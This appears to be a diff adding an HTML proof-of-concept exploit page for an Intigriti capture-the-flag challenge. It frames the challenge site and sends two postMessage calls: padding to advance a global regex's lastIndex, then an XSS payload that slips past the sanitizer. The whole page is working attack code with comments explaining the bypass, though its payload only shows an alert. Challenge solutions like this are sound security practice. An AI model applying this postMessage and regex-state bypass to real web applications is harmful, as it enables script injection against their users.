@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Intigriti Exploit</title>
+</head>
+<body>
+    <h1>Exploit Loading...</h1>
+    <iframe id="target" src="https://challenge-1225.intigriti.io" style="width:100%; height:500px;"></iframe>
+
+    <script>
+        const targetFrame = document.getElementById('target');
+
+        // Wait for the iframe to fully load before sending messages
+        targetFrame.onload = () => {
+            // Give the site a tiny moment to initialize its listeners
+            setTimeout(executeExploit, 500); 
+        };
+
+        function executeExploit() {
+            const win = targetFrame.contentWindow;
+            const targetOrigin = "https://challenge-1225.intigriti.io";
+
+            // --- STEP 1: THE PRIMER ---
+            // Send enough characters to advance the global regex 'lastIndex' 
+            // past the length of our actual payload.
+            // We append a "bad" character at the end to trigger the match 
+            // and update the regex state.
+            // Adjust '100' if necessary to ensure it's > payload length.
+            const padding = "A".repeat(100); 
+            const badChar = "<"; // The char that triggers the regex update
+            win.postMessage(padding + badChar, targetOrigin);
+
+            // --- STEP 2: THE ATTACK ---
+            // Immediately send the XSS payload. 
+            // Because the regex 'lastIndex' is now at 101 (or similar), 
+            // it starts searching *after* our payload ends.
+            // It finds nothing, considers it safe, and executes it.
+            const payload = "<img src=x onerror=alert(document.domain)>";
+            win.postMessage(payload, targetOrigin);
+        }
+    </script>
+</body>
+</html>
